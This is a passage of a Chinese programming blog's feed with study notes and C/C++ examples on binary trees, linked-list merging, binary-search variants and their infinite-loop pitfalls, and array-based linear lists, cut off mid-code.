class="hljs-comment">// 当前结点高度为左右子树最大的高度+1 </span><br>&#125;<span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125; <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>BinTree BT,ST;<br>BT = <span class="hljs-built_in">CreatBinTree</span>();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;先序遍历：&quot;</span>);<br><span class="hljs-built_in">PreOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n中序遍历：&quot;</span>);<br><span class="hljs-built_in">InOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n后序遍历：&quot;</span>);<br><span class="hljs-built_in">PostOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n层次遍历：&quot;</span>);<br><span class="hljs-built_in">LevelOrderTraversal</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n输出叶子结点:&quot;</span>); <br><span class="hljs-built_in">FindLeaves</span>(BT);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n输出树的高度：%d&quot;</span>,<span class="hljs-built_in">GetHeight</span>(BT));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-链表</title>
    <link href="/dong.github/2024/09/07/Datastructures-%E9%93%BE%E8%A1%A8/"/>
    <url>/dong.github/2024/09/07/Datastructures-%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>还记得他怎么说？“更重要的是，知道如何调整这样一种结构”</strong></p><span id="more"></span>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-8f7bdefe" role="button" aria-expanded="false" aria-controls="collapse-8f7bdefe">        <div class="fold-arrow">▶</div>例题:链表的输入输出与合并      </div>      <div class="fold-collapse collapse" id="collapse-8f7bdefe">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *PtrToNode;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>ElementType Data;<br>PtrToNode Next;<br>&#125;;<br><span class="hljs-keyword">typedef</span> PtrToNode List ;<br><br><span class="hljs-function">List <span class="hljs-title">Read</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>;<br><span class="hljs-function">List <span class="hljs-title">Merge</span><span class="hljs-params">(List L1,List L2)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L1,L2,L;<br>L1 = <span class="hljs-built_in">Read</span>();<br>L2 = <span class="hljs-built_in">Read</span>();<br>    <span class="hljs-built_in">Print</span>(L1);<br>    <span class="hljs-built_in">Print</span>(L2);<br>L = <span class="hljs-built_in">Merge</span>(L1,L2);<br><span class="hljs-built_in">Print</span>(L);<br><span class="hljs-built_in">Print</span>(L1);<br><span class="hljs-built_in">Print</span>(L2);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function">List <span class="hljs-title">Read</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>List head = L;<br><span class="hljs-type">int</span> n;cin &gt;&gt; n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<br>&#123;<br><span class="hljs-type">int</span> data;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;data);<br>List X = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>X-&gt;Data = data;<br>L-&gt;Next = X;<br>L = L-&gt;Next;<br>&#125;<br>L-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span><br><span class="hljs-function"></span>&#123;<br>List t = L-&gt;Next;<br><span class="hljs-keyword">if</span>(t==<span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL&quot;</span>);<br>&#125;<br><span class="hljs-keyword">for</span>(;t;t=t-&gt;Next)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,t-&gt;Data);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-comment">//if(L-&gt;Next = NULL)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//printf(&quot;NULL&quot;);</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//while(L-&gt;Next!=NULL)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//printf(&quot;%d&quot;,L-&gt;Next-&gt;Data);</span><br><span class="hljs-comment">//L = L-&gt;Next;</span><br><span class="hljs-comment">//&#125;</span><br>&#125;<br><span class="hljs-function">List <span class="hljs-title">Merge</span><span class="hljs-params">(List L1,List L2)</span></span><br><span class="hljs-function"></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>List head = L;<br>List tmpL1 = L1-&gt;Next;<br>List tmpL2 = L2-&gt;Next;<br><span class="hljs-keyword">while</span>(tmpL1 &amp;&amp; tmpL2)<br>&#123;<br><span class="hljs-keyword">if</span>(tmpL1-&gt;Data &lt; tmpL2-&gt;Data)&#123;<br>L-&gt;Next = tmpL1;<br>tmpL1 = tmpL1-&gt;Next;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>L-&gt;Next = tmpL2;<br>tmpL2 = tmpL2-&gt;Next;<br>&#125;<br>L = L-&gt;Next;<br>&#125;<br><span class="hljs-keyword">if</span>(tmpL1)<br>&#123;<br>L-&gt;Next = tmpL1;<br>&#125;<br><span class="hljs-keyword">if</span>(tmpL2)<br>&#123;<br>L-&gt;Next = tmpL2;<br>&#125;<br>L1-&gt;Next = <span class="hljs-literal">NULL</span>;<br>L2-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-comment">//为什么像注释中那样写就无法输出？</span><br><span class="hljs-comment">//为什么要专门留一个head结点（哑结点）不存数据？</span><br><span class="hljs-comment">//如何理解这个合并过程？重组or复制？</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>链表</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Algorithms-二分</title>
    <link href="/dong.github/2024/09/06/Algorithms-%E4%BA%8C%E5%88%86/"/>
    <url>/dong.github/2024/09/06/Algorithms-%E4%BA%8C%E5%88%86/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>二分法太常用了，学了又忘，忘了再来吧。</strong></p><span id="more"></span><h1 id="整数集合上二分"><a href="#整数集合上二分" class="headerlink" title="整数集合上二分"></a>整数集合上二分</h1><p><strong>二分难在版本太多了，用起来总是让人头晕，比如：</strong><br>Binary_search1:<br><img src="/dong.github/images/0907.jpg"><br><strong>又如：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Binary_search2</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(l &lt;= r)<br>&#123;<br><span class="hljs-type">int</span> mid=(l+r)/<span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span>(a[mid]&gt;=x) l=mid<span class="hljs-number">+1</span>;<br><span class="hljs-keyword">else</span> r=mid<span class="hljs-number">-1</span>; <br>&#125;<br><span class="hljs-keyword">return</span> mid;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>还有：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Binary_search3</span><span class="hljs-params">(<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span>(l &lt; r)<br>&#123;<br><span class="hljs-type">int</span> mid=(l+r)/<span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span>(a[mid]&gt;x) l=mid<span class="hljs-number">+1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(a[mid] &lt; x)r=mid<span class="hljs-number">-1</span>;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">return</span> mid;<br>&#125; <br></code></pre></td></tr></table></figure><p><strong>为什么会出现这么多版本方法？</strong><br><strong>究其原因，是因为：</strong><br><strong>首先，二分法是一种不断逼近的算法，不断在实数域上逼近一个答案，然而，由于计算机的整除是下取整的，这就会导致这个算法在实现上并不会尽如人意。所有的版本都是在避免一种情况：死循环。</strong></p><p><strong>三个版本都是对同一种情况的不同解决办法，下面逐一考虑：</strong></p><h2 id="考虑Binary-search1"><a href="#考虑Binary-search1" class="headerlink" title="考虑Binary_search1:"></a>考虑Binary_search1:</h2><p><strong>这个代码不对称？求大于等于和求小于等于写法不同？为什么？</strong><br><strong>感觉这个版本是最难的，但是，理解这个代码为什么会这样写，是对彻底理解二分死循环帮助最大的。</strong></p><p><strong>自然地，二分，mid&#x3D;(l+r)&#x2F;2，要取正中间才对（理论上），可是实际上是这样吗？</strong><br><strong>考虑这种情况：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">while</span>(l &lt; r)&#123;<br><span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(a[mid] &lt;= x)l = mid;<span class="hljs-keyword">else</span> r = mid - <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>l &#x3D; r - 1<br>mid &#x3D; (l + r) &#x2F; 2<br>mid &#x3D; l(下取整)<br>a[mid] &lt;&#x3D; x<br>l &#x3D; mid &#x3D; l<br>mid &#x3D; (l + r) &#x2F; 2<br>a[mid] &lt;&#x3D; x<br>l &#x3D; mid<br>…………死循环</p><h3 id="那怎么改呢，让mid-l-r-1-2，变成了上取整，于是就有了Binary-search1"><a href="#那怎么改呢，让mid-l-r-1-2，变成了上取整，于是就有了Binary-search1" class="headerlink" title="那怎么改呢，让mid&#x3D;(l+r+1)&#x2F;2，变成了上取整，于是就有了Binary_search1"></a>那怎么改呢，让mid&#x3D;(l+r+1)&#x2F;2，变成了上取整，于是就有了Binary_search1</h3><h3 id="那怎么改呢，让循环条件l"><a href="#那怎么改呢，让循环条件l" class="headerlink" title="那怎么改呢，让循环条件l&lt;&#x3D;r，l&#x3D;mid-1，让两个指针错过后取中间，于是就有了Binary_search2"></a>那怎么改呢，让循环条件l&lt;&#x3D;r，l&#x3D;mid-1，让两个指针错过后取中间，于是就有了Binary_search2</h3><h3 id="那怎么改呢，让循环条件不变，单独考虑a-mid-x时，再加一个else分支判断一下，于是就有了Binary-search3"><a href="#那怎么改呢，让循环条件不变，单独考虑a-mid-x时，再加一个else分支判断一下，于是就有了Binary-search3" class="headerlink" title="那怎么改呢，让循环条件不变，单独考虑a[mid]&#x3D;x时，再加一个else分支判断一下，于是就有了Binary_search3"></a>那怎么改呢，让循环条件不变，单独考虑a[mid]&#x3D;x时，再加一个else分支判断一下，于是就有了Binary_search3</h3><h2 id="没明白？"><a href="#没明白？" class="headerlink" title="没明白？"></a>没明白？</h2><p><strong>可是现在还是没明白为什么b1要分情况两种写法，而b2,b3只需一种写法即可。</strong><br><strong>打个比方，三个方法都在设计夹子夹住答案，而b1就是设计了一把不对称的夹子，或左大右小（下取整），或左小右大（上取整）</strong><br><strong>另外两种夹子写起来是对称的，所以省心些。</strong></p><h2 id="还是没明白？"><a href="#还是没明白？" class="headerlink" title="还是没明白？"></a>还是没明白？</h2><p><strong>可是现在还没明白为什么一会上取整，一会又下取整？</strong><br><strong>其实二分法本身就不对称，答案是一个整数，要么从左边趋近它，要么从右边趋近它，这就要考虑不同情况。</strong></p><h2 id="就是想用basesearch1？"><a href="#就是想用basesearch1？" class="headerlink" title="就是想用basesearch1？"></a>就是想用basesearch1？</h2><p><strong>《算法竞赛-进阶指南》给出了指导意见：</strong><br><img src="/dong.github/images/0907-1.jpg"></p><h2 id="例题：线性表整数二分查找"><a href="#例题：线性表整数二分查找" class="headerlink" title="例题：线性表整数二分查找"></a>例题：线性表整数二分查找</h2>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>title:code      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NotFound 0</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> Position ;<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span><br>&#123;<br>ElementType Data[MAXSIZE];<br>Position Last;<br>&#125;;<br><br><span class="hljs-function">List <span class="hljs-title">CreatList</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function">Position <span class="hljs-title">BinarySearch</span><span class="hljs-params">(List ,ElementType X)</span></span>;<br><br><span class="hljs-function">List <span class="hljs-title">CreatList</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L;<br>L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>L-&gt;Last = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> L;<br>&#125;<br><span class="hljs-function">Position <span class="hljs-title">BinarySearch</span><span class="hljs-params">(List L,ElementType X)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> left = <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> right = L-&gt;Last;<br><span class="hljs-keyword">while</span>(left &lt; right)<br>&#123;<br><span class="hljs-type">int</span> center = (left+right) / <span class="hljs-number">2</span>;<br><span class="hljs-keyword">if</span>(X &gt; L-&gt;Data[center])<br>&#123;<br>left = center + <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(X &lt; L-&gt;Data[center])<br>&#123;<br>right  = center - <span class="hljs-number">1</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">return</span> center;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> NotFound;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L;<br>ElementType X;<br>Position P;<br><br>L = <span class="hljs-built_in">CreatList</span>();<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt; <span class="hljs-number">4</span>;++ i)<br>&#123;<br>L-&gt;Data[i] = <span class="hljs-number">2</span> * i - <span class="hljs-number">1</span>;<br>&#125;<br>L-&gt;Last = <span class="hljs-number">3</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;X);<br>P = <span class="hljs-built_in">BinarySearch</span>(L,X);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,P);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>        </div>      </div>    </div><h2 id="综上所述："><a href="#综上所述：" class="headerlink" title="综上所述："></a>综上所述：</h2><p><strong>其实二分只有一种，每次写的时候想象你设计的夹子的样子，脑补那个死循环的样子，不变应万变了。</strong><br><img src="/dong.github/images/0907-2.jpg"><br><strong>好了，现在理解了整数二分，那么二分答案、实数二分、三分……也就不难了，后续在本文中补齐。</strong></p>]]></content>
    
    
    <categories>
      
      <category>Theory</category>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>二分</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Datastructures-线性表</title>
    <link href="/dong.github/2024/09/06/Datastructures-%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
    <url>/dong.github/2024/09/06/Datastructures-%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>线性表的数组和链表实现，以及线性表拓展。</strong></p><span id="more"></span><p><strong>这里第一个难点就是理解指针是什么，指针是什么呢？</strong><br><strong>线性表，像数组吧，数组和链表是它的两种实现方式。</strong><br><strong>数组存：</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 100  <span class="hljs-comment">// MAXSIZE 定义为 Data 数组的大小</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ElementType;  <span class="hljs-comment">// ElementType 可定义为任意类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List; <br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;<br>   ElementType Data[MAXSIZE]; <br>   <span class="hljs-type">int</span> Last;  <span class="hljs-comment">// Last 定义线性表的最后一个元素</span><br>&#125;;<br>List L;<br><span class="hljs-comment">//访问下标为 i 的元素：L-&gt;Data[i]</span><br><span class="hljs-comment">//线性表的长度：L-&gt;Last+1</span><br><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//初始化顺序表 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>; <span class="hljs-comment">//查找 X 第一次出现的下标 </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>; <span class="hljs-comment">//在下标为 i 的地方插入 X </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Delete</span><span class="hljs-params">(<span class="hljs-type">int</span> i,List L)</span></span>;   <span class="hljs-comment">//删除下标为 i 的当前值 </span><br><span class="hljs-function">ElementType <span class="hljs-title">FindKth</span><span class="hljs-params">(<span class="hljs-type">int</span> K,List L)</span></span>;  <span class="hljs-comment">//返回下标为 K 的当前值</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Length</span><span class="hljs-params">(List L)</span></span>;  <span class="hljs-comment">//返回顺序表的长度 </span><br> <br><span class="hljs-comment">//初始化 </span><br><span class="hljs-function">List <span class="hljs-title">MakeEmpty</span><span class="hljs-params">()</span></span>&#123;<br>    List L;<br>    L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>    L-&gt;Last = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> L;<br>&#125;<br><br><span class="hljs-comment">// 按值查找 </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Find</span><span class="hljs-params">(ElementType X,List L)</span></span>&#123;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(i &lt;= L-&gt;Last &amp;&amp; L-&gt;Data[i] != X)  <br>        i++;<br>    <span class="hljs-keyword">if</span>(L-&gt;Last &lt; i)  <span class="hljs-comment">//如果没找到，返回 -1</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>; <br>    <span class="hljs-keyword">else</span>    <span class="hljs-comment">// 找到后返回下标 </span><br>        <span class="hljs-keyword">return</span> i;<br>&#125;<br><br><span class="hljs-comment">// 插入</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Insert</span><span class="hljs-params">(ElementType X,<span class="hljs-type">int</span> i,List L)</span></span>&#123;<br>    <span class="hljs-type">int</span> j;<br>    <span class="hljs-keyword">if</span>(L-&gt;Last == MAXSIZE<span class="hljs-number">-1</span>)&#123;  <span class="hljs-comment">//位置已满 </span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;表满&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(i &lt; <span class="hljs-number">0</span> || 